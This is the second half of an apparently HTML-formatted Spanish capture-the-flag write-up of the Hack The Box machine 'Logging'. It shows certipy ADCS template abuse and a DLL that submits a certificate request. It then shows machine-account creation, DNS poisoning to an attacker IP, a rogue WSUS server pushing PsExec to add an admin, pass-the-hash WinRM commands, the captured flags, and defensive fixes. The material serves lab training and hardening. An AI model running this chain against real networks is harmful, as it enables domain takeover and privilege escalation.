+    <div class="output-box">
+      <div class="output-label">monitor.log — confirmación</div>
+<pre>[2026-04-26 13:47:15] Calling 'PreUpdateCheck' in settings_update.dll
+[2026-04-26 13:47:16] Update check completed.</pre>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">user.txt</div>
+      <div class="flag-value">c8042b74abcd4a5d4fbebe607fa2f1f8</div>
+    </div>
+  </div>
+</div>
+
+<!-- 05 — ADCS + WSUS -->
+<div class="section">
+  <h2>05 · ADCS + DNS Poison + Rogue WSUS</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 10 — ADCS Enum</div>
+    <h3>Plantilla UpdateSrv (ESC1-adjacent)</h3>
+    <div class="why-box">
+      <strong>¿Qué es Certipy?</strong>
+      <p>Herramienta estándar para auditoría de ADCS. <code>find -stdout -enabled</code> lista plantillas activas con sus configuraciones de seguridad y detecta vulnerabilidades ESC1-ESC13 automáticamente.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">faketime</span> <span class="flag-opt">-f</span> <span class="str-c">"+7h"</span> <span class="cmd">certipy-ad</span> find <span class="flag-opt">-u</span> <span class="str-c">'msa_health$@logging.htb'</span> <span class="flag-opt">-hashes</span> <span class="str-c">':603fc24ee01a9409f83c9d1d701485c5'</span> <span class="flag-opt">-target</span> DC01.logging.htb <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">-stdout -enabled</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Plantilla UpdateSrv</div>
+<pre>Template Name           : <span class="hl-orange">UpdateSrv</span>
+Schema Version          : 2
+Client Authentication   : False
+<span class="hl-red">Enrollee Supplies Subject: True</span>
+Extended Key Usage      : Server Authentication
+<span class="hl-yellow">Enrollment Rights       : LOGGING\IT</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Por qué es crítico (pero no ESC1 clásico)</strong>
+      <p><code>ENROLLEE_SUPPLIES_SUBJECT</code> permite indicar cualquier nombre en el Subject/SAN. Como solo tiene EKU de <strong>Server Authentication</strong> (no Client Auth), Kerberos lo rechaza para PKINIT — pero sirve para impersonar cualquier servicio HTTPS que el DC confíe, incluyendo su propio endpoint WSUS.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Generar CSR para <code>wsus.logging.htb</code> en Kali (clave privada local), subirla al DC y usar la DLL para que <code>jaylee.clifton</code> (miembro de IT) la envíe a la CA. El cert resultante permite servir HTTPS WSUS firmado por <code>logging-DC01-CA</code>.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 11 — Cert Request</div>
+    <h3>CSR + obtención del certificado TLS para wsus.logging.htb</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># build_wsus_csr.py — la clave privada NUNCA sale de Kali</span></div>
+<pre>from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+open('wsus_key.pem','wb').write(pk.private_bytes(...))
+csr = (x509.CertificateSigningRequestBuilder()
+       .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,'wsus.logging.htb')]))
+       .add_extension(x509.SubjectAlternativeName([
+           x509.DNSName('wsus.logging.htb'), x509.DNSName('wsus')]), critical=False)
+       .sign(pk, hashes.SHA256()))
+open('req.csr','wb').write(csr.public_bytes(serialization.Encoding.DER))</pre>
+      <div class="cmd-line"><span class="comment-c"># DLL certreq.c — se ejecuta como jaylee.clifton via UpdateChecker Agent</span></div>
+<pre>system("cmd /c certreq -f -submit "
+       "-attrib \"CertificateTemplate:UpdateSrv\" "
+       "-config \"DC01.logging.htb\\logging-DC01-CA\" "
+       "C:\\ProgramData\\UpdateMonitor\\req.csr "
+       "C:\\ProgramData\\UpdateMonitor\\cert.cer "
+       "&gt; C:\\ProgramData\\UpdateMonitor\\submit_log.txt 2&gt;&amp;1 &lt; NUL");</pre>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Verificación del certificado</div>
+<pre>$ openssl x509 -in wsus_cert.cer -noout -subject -issuer -dates
+subject=<span class="hl-green">CN=wsus.logging.htb</span>
+issuer=DC=htb, DC=logging, CN=<span class="hl-orange">logging-DC01-CA</span>
+notBefore=Apr 25 22:37:15 2026 GMT
+notAfter=Apr 22 22:37:15 <span class="hl-green">2036</span> GMT</pre>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 12 — DNS Poison</div>
+    <h3>Cuenta de máquina + envenenamiento DNS</h3>
+    <div class="why-box">
+      <strong>SeMachineAccountPrivilege + DNS ACLs por defecto</strong>
+      <p><code>msa_health$</code> tiene <code>SeMachineAccountPrivilege</code>: puede crear cuentas de máquina (quota 10). Las cuentas de máquina autenticadas pueden crear registros DNS en la zona AD por defecto. Esto da escritura DNS sin comprometer un DC.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># 1. Crear cuenta de máquina attacker01$</span></div>
+      <div class="cmd-line"><span class="cmd">faketime</span> <span class="flag-opt">-f</span> <span class="str-c">"+7h"</span> <span class="cmd">impacket-addcomputer</span> <span class="flag-opt">-computer-name</span> <span class="str-c">'attacker01$'</span> <span class="flag-opt">-computer-pass</span> <span class="str-c">'SuperP@ss1!'</span> <span class="flag-opt">-hashes</span> <span class="str-c">':603fc24ee01a9409f83c9d1d701485c5'</span> <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.26.35</span> <span class="str-c">'logging.htb/msa_health$'</span></div>
+      <div class="cmd-line"><span class="comment-c"># 2. Registrar A record wsus.logging.htb → 10.10.14.154 via LDAP</span></div>
+      <div class="cmd-line"><span class="cmd">python3</span> add_dns.py</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Verificación DNS desde el DC</div>
+<pre>$ nslookup wsus.logging.htb 10.129.26.35
+Name:    <span class="hl-orange">wsus.logging.htb</span>
+Address: <span class="hl-green">10.10.14.154</span></pre>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 13 — Rogue WSUS</div>
+    <h3>Servidor WSUS falso con wsuks</h3>
+    <div class="danger-box">
+      <strong>wsuks vs pywsus — diferencia crítica</strong>
+      <p><code>pywsus</code> falla silenciosamente contra Server 2019: su <code>sync-updates.xml</code> anuncia la actualización bajo una categoría que el DC no tiene registrada, y el cliente logea <em>"0 updates detected"</em>. <code>wsuks</code> usa un XML simplificado y el cliente descarga el binario.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Combined PEM: cert primero, key después (ssl.SSLContext)</span></div>
+      <div class="cmd-line"><span class="cmd">cat</span> wsus_srv_cert.pem wsus_srv_key.pem &gt; wsus_proper.pem</div>
+      <div class="cmd-line"><span class="comment-c"># Iniciar servidor WSUS falso en 8531 (HTTPS)</span></div>
+      <div class="cmd-line"><span class="cmd">sudo</span> /home/kali/.local/bin/wsuks <span class="flag-opt">--serve-only</span> <span class="flag-opt">-I</span> tun0 <span class="flag-opt">-t</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">--WSUS-Server</span> wsus.logging.htb <span class="flag-opt">--tls-cert</span> wsus_proper.pem <span class="flag-opt">-e</span> PsExec64.exe <span class="flag-opt">-c</span> <span class="str-c">'/accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add"'</span></div>
+      <div class="cmd-line"><span class="comment-c"># Forzar Windows Update scan desde WinRM</span></div>
+      <div class="cmd-line"><span class="cmd">wuauclt</span> /resetauthorization /detectnow; <span class="cmd">usoclient</span> StartScan</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">wsuks — handshake WSUS completo</div>
+<pre>[*] Starting WSUS Server on <span class="hl-orange">10.10.14.154:8531</span>... (HTTPS)
+[*] Serving executable as KB: 3933848
+
+[+] POST /ClientWebService/client.asmx — <span class="hl-blue">GetCookie</span>
+[+] POST /ClientWebService/client.asmx — <span class="hl-blue">GetConfig</span>
+[+] POST /ClientWebService/client.asmx — <span class="hl-blue">SyncUpdates</span>
+[+] POST /ClientWebService/client.asmx — <span class="hl-blue">GetExtendedUpdateInfo</span>
+[+] GET  /857c11b1.../PsExec64.exe   <span class="hl-yellow">← descarga 1 (HEAD validation)</span>
+[+] GET  /857c11b1.../PsExec64.exe   <span class="hl-green">← descarga 2 (contenido)</span></pre>
+    </div>
+  </div>
+</div>
+
+<!-- 06 — ROOT FLAG -->
+<div class="section">
+  <h2>06 · Root Flag</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 14 — Privilege Escalation</div>
+    <h3>Verificación: msa_health$ añadida a Administrators</h3>
+    <p style="color:var(--text2);font-size:.92rem;margin-bottom:1rem;">~1 min después de la descarga, Windows Update ejecuta <code>PsExec64</code> como SYSTEM con el comando <code>net localgroup administrators msa_health$ /add</code>.</p>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nxc</span> <span class="param">winrm</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">-u</span> <span class="str-c">'msa_health$'</span> <span class="flag-opt">-H</span> <span class="str-c">'603fc24ee01a9409f83c9d1d701485c5'</span> <span class="flag-opt">-X</span> <span class="str-c">'net localgroup administrators'</span></div>
+    </div>
+    <div class="output-box">
+<pre>Members
+Administrator
+Domain Admins
+Enterprise Admins
+<span class="hl-green">msa_health$</span>
+toby.brynleigh</pre>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 15 — Rooted</div>
+    <h3>Lectura de root.txt desde toby.brynleigh</h3>
+    <div class="warn-box">
+      <strong>Trampa: root.txt no está en Administrator\Desktop</strong>
+      <p>El directorio <code>C:\Users\Administrator\Desktop</code> solo contiene <code>desktop.ini</code>. La flag está en el Desktop de <code>toby.brynleigh</code>, el Domain Admin del dominio.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nxc</span> <span class="param">winrm</span> <span class="ip">10.129.26.35</span> <span class="flag-opt">-u</span> <span class="str-c">'msa_health$'</span> <span class="flag-opt">-H</span> <span class="str-c">'603fc24ee01a9409f83c9d1d701485c5'</span> <span class="flag-opt">-X</span> <span class="str-c">'type C:\Users\toby.brynleigh\Desktop\root.txt'</span></div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">root.txt</div>
+      <div class="flag-value">84badb95685dfdcec3487b695e971d14</div>
+    </div>
+  </div>
+</div>
+
+<!-- 07 — DIAGRAMA -->
+<div class="section">
+  <h2>07 · Diagrama de la Cadena de Ataque</h2>
+  <div class="ascii-box">
+<pre><span class="ac-o">wallace.everette:Welcome2026@</span>  (credenciales proporcionadas)
+        │
+        ▼
+<span class="ac-b">\\DC01\Logs</span>  (share SMB legible por usuarios autenticados)
+        ├─ IdentitySync_Trace_20260219.log
+        │      └─ BindPass: "Em3rg3ncyPa$$<span class="ac-r">2025</span>" → probar año actual
+        ▼
+<span class="ac-o">svc_recovery:Em3rg3ncyPa$$2026</span>  (Kerberos — Protected Users)
+        │
+        ▼  BloodHound: GenericWrite → msa_health$ (gMSA)
+<span class="ac-r">msDS-GroupMSAMembership</span> sobreescrito → lectura del blob
+        ▼
+<span class="ac-g">msa_health$ NTLM: 603fc24ee01a9409f83c9d1d701485c5</span>
+        ▼  Pass-the-Hash
+<span class="ac-b">WinRM como msa_health$</span>  (SeMachineAccountPrivilege)
+        │
+        ├─── DLL Hijack ────────────────────────────────────────
+        │      Settings_Update.zip → C:\ProgramData\UpdateMonitor\
+        │      UpdateChecker Agent (3 min) → corre como jaylee.clifton
+        │      DLL 32-bit cargada → <span class="ac-b">CODE EXEC como jaylee.clifton</span>
+        │           ├─ <span class="ac-g">user.txt: c8042b74...</span>
+        │           └─ certreq → <span class="ac-p">UpdateSrv template</span> (IT group)
+        │                       └─ ENROLLEE_SUPPLIES_SUBJECT
+        │                              └─ CN=wsus.logging.htb
+        │
+        ├─── DNS Poison ────────────────────────────────────────
+        │      impacket-addcomputer → attacker01$
+        │      LDAP dnsNode create → wsus.logging.htb A 10.10.14.154
+        │
+        └─── Rogue WSUS ────────────────────────────────────────
+             wsuks --serve-only --tls-cert wsus_proper.pem (8531/HTTPS)
+             GetCookie → SyncUpdates → PsExec64.exe
+             SYSTEM ejecuta: net localgroup administrators <span class="ac-g">msa_health$ /add</span>
+                  ▼
+        <span class="ac-g">msa_health$ ∈ BUILTIN\Administrators</span>
+                  ▼
+        <span class="ac-g">root.txt: 84badb95685dfdcec3487b695e971d14</span>
+        (C:\Users\toby.brynleigh\Desktop\root.txt)</pre>
+  </div>
+</div>
+
+<!-- 08 — VULNERABILIDADES -->
+<div class="section">
+  <h2>08 · Análisis de Vulnerabilidades</h2>
+  <div class="vuln-card"><h3>01 — Credenciales en texto plano en share SMB (CWE-312)</h3><p>El log <code>IdentitySync_Trace</code> almacenó un dump del contexto LDAP con contraseñas en claro, en un share accesible para todos los usuarios del dominio. <strong>Fix:</strong> sanitizar credenciales antes de loguear; logging estructurado con redacción automática.</p></div>
+  <div class="vuln-card"><h3>02 — GenericWrite sobre gMSA → escalada de hash</h3><p><code>GenericWrite</code> sobre una gMSA equivale efectivamente a poseer su contraseña. <strong>Fix:</strong> auditar ACLs sobre gMSA; conceder GenericWrite solo a cuentas administrativas dedicadas.</p></div>
+  <div class="vuln-card"><h3>03 — DLL Hijack via tarea programada (CWE-427)</h3><p>Una tarea programada que corre como un usuario privilegiado carga DLLs desde un directorio escribible por cuentas menos privilegiadas. <strong>Fix:</strong> restringir permisos del directorio de input; nunca cargar DLLs sin verificar firma.</p></div>
+  <div class="vuln-card"><h3>04 — Plantilla ADCS con ENROLLEE_SUPPLIES_SUBJECT</h3><p>Permite obtener certificados TLS para cualquier hostname que el dominio confíe. <strong>Fix:</strong> deshabilitar ENROLLEE_SUPPLIES_SUBJECT; SANs pre-aprobadas; restringir enrollment.</p></div>
+  <div class="vuln-card"><h3>05 — WSUS sin firma de código adicional (CWE-494)</h3><p>Windows Update instala cualquier binario firmado por Microsoft servido por el WSUS configurado. <strong>Fix:</strong> WSUS sobre HTTPS con PKI estrictamente controlada, en servidor dedicado; monitorizar procesos hijos de wuauserv con Sysmon.</p></div>
+  <div class="vuln-card"><h3>06 — DNS dinámico abierto a Authenticated Users</h3><p>Cualquier cuenta autenticada puede crear registros DNS en zonas integradas en AD. <strong>Fix:</strong> restringir <code>CreateChild</code> en dnsNode a administradores DNS; auditar registros no estándar.</p></div>
+</div>
+
+<!-- 09 — LECCIONES -->
+<div class="section">
+  <h2>09 · Lecciones Aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card"><h4>01 — Logs como almacén de credenciales</h4><p>La primera búsqueda en cualquier share SMB no estándar debe ser <code>grep -ri "pass\|bind\|secret\|cred"</code>.</p></div>
+    <div class="lesson-card"><h4>02 — Rotación por año</h4><p>Si una credencial de log antiguo falla, probar reemplazando el año por el actual. Patrón común en políticas anuales.</p></div>
+    <div class="lesson-card"><h4>03 — GenericWrite en gMSA = poseer el hash</h4><p>Permite directamente modificar quién puede leer la contraseña administrada y dumpearla.</p></div>
+    <div class="lesson-card"><h4>04 — Hashes gMSA sobreviven snapshots HTB</h4><p>La rotación es cada 30 días, no por reset de VM. El mismo hash sigue válido para WinRM tras nueva IP.</p></div>
+    <div class="lesson-card"><h4>05 — DLLs en .NET Prefer 32-bit</h4><p>Una DLL 64-bit devuelve <code>ERROR_BAD_EXE_FORMAT</code> (193). Compilar siempre con <code>i686-w64-mingw32-gcc</code>.</p></div>
+    <div class="lesson-card"><h4>06 — wsuks &gt; pywsus en Server 2019</h4><p>pywsus falla por categoría de producto no registrada. wsuks usa un XML simplificado que sí funciona.</p></div>
+    <div class="lesson-card"><h4>07 — root.txt no siempre en Administrator</h4><p>Cuando hay Domain Admins explícitos, la flag puede estar en su Desktop. Buscar con <code>Get-ChildItem C:\Users -Recurse -Filter *.txt</code>.</p></div>
+    <div class="lesson-card"><h4>08 — MITM puramente AD</h4><p><code>SeMachineAccountPrivilege</code> + ACLs DNS por defecto = MITM sin necesidad de capa 2.</p></div>
+  </div>
+</div>
+
+</main>
+
+<!-- ═══ SIDEBAR ═══ -->
+<aside class="sidebar">
+  <div class="sidebar-card">
+    <h4>Metadata</h4>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">HTB</span></div>
+    <div class="meta-row"><span class="meta-label">Estado</span><span class="meta-value" style="color:var(--red);">● Active</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:#f5a623;">Medium</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Win 2019</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.26.35</span></div>
+    <div class="meta-row"><span class="meta-label">Hostname</span><span class="meta-value">DC01</span></div>
+    <div class="meta-row"><span class="meta-label">Dominio</span><span class="meta-value">LOGGING.HTB</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Skills</h4>
+    <div class="skill-row"><div class="skill-name"><span>Active Directory</span><span style="color:var(--green);">95%</span></div><div class="skill-bar"><div class="skill-fill" style="width:95%;"></div></div></div>
+    <div class="skill-row"><div class="skill-name"><span>gMSA Abuse</span><span style="color:var(--green);">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%;"></div></div></div>
+    <div class="skill-row"><div class="skill-name"><span>ADCS Exploitation</span><span style="color:var(--green);">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%;"></div></div></div>
+    <div class="skill-row"><div class="skill-name"><span>WSUS / DNS Poison</span><span style="color:var(--green);">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%;"></div></div></div>
+    <div class="skill-row"><div class="skill-name"><span>DLL Hijacking</span><span style="color:var(--green);">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%;"></div></div></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tools</h4>
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">nxc</span>
+    <span class="tool-tag">smbclient</span>
+    <span class="tool-tag">impacket</span>
+    <span class="tool-tag">bloodhound-py</span>
+    <span class="tool-tag">gMSADumper</span>
+    <span class="tool-tag">evil-winrm</span>
+    <span class="tool-tag">certipy-ad</span>
+    <span class="tool-tag">faketime</span>
+    <span class="tool-tag">mingw32</span>
+    <span class="tool-tag">wsuks</span>
+    <span class="tool-tag">openssl</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1078.002</span>
+    <span class="mitre-tag">T1135</span>
+    <span class="mitre-tag">T1552.001</span>
+    <span class="mitre-tag">T1558</span>
+    <span class="mitre-tag">T1098.001</span>
+    <span class="mitre-tag">T1550.002</span>
+    <span class="mitre-tag">T1574.001</span>
+    <span class="mitre-tag">T1649</span>
+    <span class="mitre-tag">T1557</span>
+    <span class="mitre-tag">T1195.002</span>
+    <span class="mitre-tag">T1068</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <div style="display:flex;flex-direction:column;gap:.3rem;">
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">01 · Reconocimiento</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">02 · Credenciales en Logs</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">03 · gMSA Abuse</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">04 · DLL Hijack</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">05 · ADCS + WSUS</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">06 · Root Flag</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">07 · Diagrama</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">08 · Vulnerabilidades</a>
+      <a href="#" style="font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-left:2px solid var(--border);">09 · Lecciones</a>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags</h4>
+    <div style="background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.2);border-radius:8px;padding:.7rem;text-align:center;margin-bottom:.5rem;">
+      <div style="font-size:.62rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.4rem;">user.txt</div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--blue);word-break:break-all;font-weight:700;">c8042b74abcd4a5d4fbebe607fa2f1f8</div>
+    </div>
+    <div style="background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);border-radius:8px;padding:.7rem;text-align:center;">
+      <div style="font-size:.62rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.4rem;">root.txt</div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--green);word-break:break-all;font-weight:700;">84badb95685dfdcec3487b695e971d14</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario Rápido</h4>
+    <div class="glosario-item"><span class="glosario-term">gMSA</span><span class="glosario-def">Group Managed Service Account — contraseña rotada por el DC cada 30 días, leída por miembros de msDS-GroupMSAMembership.</span></div>
+    <div class="glosario-item"><span class="glosario-term">GenericWrite</span><span class="glosario-def">Permiso AD para sobreescribir atributos no protegidos. En gMSA = control total.</span></div>
+    <div class="glosario-item"><span class="glosario-term">Pass-the-Hash</span><span class="glosario-def">Autenticación NTLM usando el hash NT directamente, sin la contraseña en claro.</span></div>
+    <div class="glosario-item"><span class="glosario-term">ADCS</span><span class="glosario-def">Active Directory Certificate Services — PKI integrada en AD.</span></div>
+    <div class="glosario-item"><span class="glosario-term">ENROLLEE_SUPPLIES_SUBJECT</span><span class="glosario-def">Flag de plantilla que deja al solicitante elegir el Subject/SAN del cert.</span></div>
+    <div class="glosario-item"><span class="glosario-term">WSUS</span><span class="glosario-def">Windows Server Update Services — distribución de actualizaciones; el cliente las instala como SYSTEM.</span></div>
+    <div class="glosario-item"><span class="glosario-term">wsuks</span><span class="glosario-def">Servidor WSUS falso que entrega un binario Microsoft (PsExec64) con un comando arbitrario.</span></div>
+    <div class="glosario-item"><span class="glosario-term">Protected Users</span><span class="glosario-def">Grupo AD que prohíbe NTLM/RC4 a sus miembros. Bloquea PtH sobre svc_recovery.</span></div>
+  </div>
+</aside>
+</div>
+
+<!-- FOOTER -->
+<footer style="background:var(--forest);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text3);font-size:.82rem;">HTB Active · Logging · Medium · Windows Server 2019 · LOGGING.HTB · 2026-04-26</p>
+  <p style="color:var(--text3);font-size:.78rem;margin-top:.35rem;">Reporte generado por <span style="color:var(--green);">kali</span> · Cadena: SMB Logs → svc_recovery → gMSA hash → DLL Hijack → ADCS → DNS Poison → Rogue WSUS → SYSTEM</p>
+</footer>
+
+<script src="https://unpkg.com/three@0.160.0/build/three.min.js"></script>
+<script>
+(function(){
+  var c=document.getElementById('heroOrb');if(!c)return;
+  var r=new THREE.WebGLRenderer({canvas:c,antialias:true,alpha:true});
+  r.setPixelRatio(Math.min(devicePixelRatio,2));r.setSize(260,260,false);
+  var s=new THREE.Scene(),cam=new THREE.PerspectiveCamera(58,1,0.1,100);cam.position.z=7.4;
+  var cfg=[[1.45,3,0.06],[2.1,1,0.03],[2.75,1,0.018]];
+  var sp=cfg.map(function(v){var m=new THREE.Mesh(new THREE.IcosahedronGeometry(v[0],v[1]),new THREE.MeshBasicMaterial({color:0x00e87a,wireframe:true,transparent:true,opacity:v[2]}));s.add(m);return m;});
+  var t=0;(function a(){requestAnimationFrame(a);t+=0.012;sp[0].rotation.y=t*0.35;sp[0].rotation.x=t*0.18;sp[1].rotation.y=-t*0.25;sp[1].rotation.z=t*0.15;sp[2].rotation.y=t*0.15;sp[2].rotation.z=-t*0.1;r.render(s,cam);})();
+})();
+</script>
+</body>
+</html>
